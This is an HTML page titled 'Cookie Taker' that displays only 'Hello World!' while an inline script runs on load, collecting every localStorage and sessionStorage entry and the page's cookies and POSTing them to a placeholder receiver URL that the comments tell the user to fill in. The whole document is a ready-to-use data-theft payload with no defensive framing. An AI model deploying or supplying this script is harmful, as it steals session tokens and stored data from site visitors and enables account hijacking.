<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Cookie Taker</title>
    </head>

    <body>
        <h1>Hello World!</h1>
        <script>
            function getStorage(storage) {
                return Object.keys(storage).map(function (key) {
                    return [key, storage.getItem(key)];
                });
            };

            var local = this.getStorage(localStorage);
            var session = this.getStorage(sessionStorage);
            var cookies = document.cookie;

            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    console.log(xhttp.responseText);
                }
            };
            // Change 'YOUR_URL' to host URL receiver
            xhttp.open('POST', 'YOUR_URL', true);
            xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            // Send payload can be modified to follow the host requisitions
            xhttp.send('local='+JSON.stringify(local)+'&sess='+JSON.stringify(session)+'&cookies='+cookies);
        </script>
    </body>

</html>
